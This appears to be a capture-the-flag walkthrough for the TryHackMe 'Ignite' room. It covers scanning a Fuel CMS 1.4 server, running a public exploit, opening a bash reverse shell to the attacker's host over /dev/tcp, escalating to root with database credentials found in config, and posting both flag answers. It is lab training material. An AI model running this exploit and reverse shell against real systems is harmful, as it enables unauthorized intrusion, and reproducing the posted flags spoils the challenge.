# [Ignite](https://tryhackme.com/room/ignite)

> A new start-up has a few issues with their web server

## Scanning

Scan the target with nmap

```
nmap -A -T4 10.10.138.185
```

![image](https://user-images.githubusercontent.com/90561566/188138041-0e800d6a-7fc8-41a8-8bb4-e9535589f31d.png)

Hmm, found only 1 open port 80 (http)

## HTTP

Go to the web page

![image](https://user-images.githubusercontent.com/90561566/188138642-85ed4d57-3ec3-4467-bed3-dde8f7355691.png)

It's default page of fuel cms 1.4

## Enumeration

Gobuster to discover hidden directory

```
gobuster dir -u http://10.10.138.185 -w /usr/share/wordlists/dirb/common.txt -t 30
```

![image](https://user-images.githubusercontent.com/90561566/188139192-d3977108-ff1f-43e1-b05b-5f6b4d0a6b41.png)

I connected to /0/ and /home/ directory and maybe in vain

![image](https://user-images.githubusercontent.com/90561566/188139966-5029d435-ba8f-4ceb-ba6d-a7a5f464cdbb.png)

I had logggd in and see nothing too

## Exploitation

I search exploit for fuelcms

```
searchsploit fuelcms 1.4
```

![image](https://user-images.githubusercontent.com/90561566/188140509-e7f1d285-a42e-4e56-bb53-75ce63f1e2af.png)

copy exploit

```
searchsploit -m 47138.py
vi 47138.py
```

change line 14 to target ip

![image](https://user-images.githubusercontent.com/90561566/188140922-cc1950b3-b5cc-46e5-a836-27ab5cd654f4.png)

```
chmod +x 47138.py
python 47138.py
```

![image](https://user-images.githubusercontent.com/90561566/188256466-ef67f34d-b02c-421e-b8f1-f15a6393e4a9.png)

now we open a reverse shell to control easily

```
vi rev.sh
bash -i >& /dev/tcp/<your_ip>/4444 0>&1
```

open 2 tab

```
python3 -m http.server 80 # http server to download file
and
nc -vlnp 4444 # netcat listener on port 4444
```

next

![image](https://user-images.githubusercontent.com/90561566/188258559-b452576b-a916-4c41-b363-ba8633f969d4.png)

![image](https://user-images.githubusercontent.com/90561566/188258613-6d26529d-c131-401b-b075-8e214dc59ead.png)

![image](https://user-images.githubusercontent.com/90561566/188258643-545ca4a4-bc4e-48ff-b7dd-5259cef13e47.png)

okay, we got a shell

![image](https://user-images.githubusercontent.com/90561566/188258669-b25aaa28-44ff-4efe-b405-4077b1fa26c4.png)

search flag on /home

![image](https://user-images.githubusercontent.com/90561566/188258710-0b59be70-6923-4025-969f-8b4e9fc3e659.png)

| Flag | User.txt |
| --- | --- |
| Answer | 6470e394cbf6dab6a91682cc8585059b |

## Privilege Escalation

I tried `sudo -l -l` but it didn't work

![image](https://user-images.githubusercontent.com/90561566/188258803-f8a5356b-c65f-4b64-aa0e-cf56bc438f19.png)

during reconnaissance i noticed some instructions related to Database configuration on the webpage

![image](https://user-images.githubusercontent.com/90561566/188258939-44efe6c8-f5e6-4b8f-a8a6-347bc6c00804.png)

```
cat fuel/application/config/database.php
```

![image](https://user-images.githubusercontent.com/90561566/188258995-6329d359-e685-4b0c-9cf1-042a6be1919c.png)

there is it

![image](https://user-images.githubusercontent.com/90561566/188259024-19eed0e6-7dcb-43ba-9703-c8d01e3c6ec6.png)

user: root, pass: mememe

![image](https://user-images.githubusercontent.com/90561566/188259227-9b187eef-6ca7-4700-bf76-f0840007dca6.png)

i got an error, after gg search, here is the solution

```
python -c 'import pty; pty.spawn("/bin/sh")'

echo os.system('/bin/bash')

/bin/sh -i
```

![image](https://user-images.githubusercontent.com/90561566/188259287-2f59492d-31f2-440b-96a1-44d7c0665678.png)

here you are

![image](https://user-images.githubusercontent.com/90561566/188259334-cb02362c-d167-471a-848e-8a9cb86ed442.png)

| Flag | root.txt |
| --- | --- |
| Answer | b9bbcb33e11b80be759c4e844862482d |
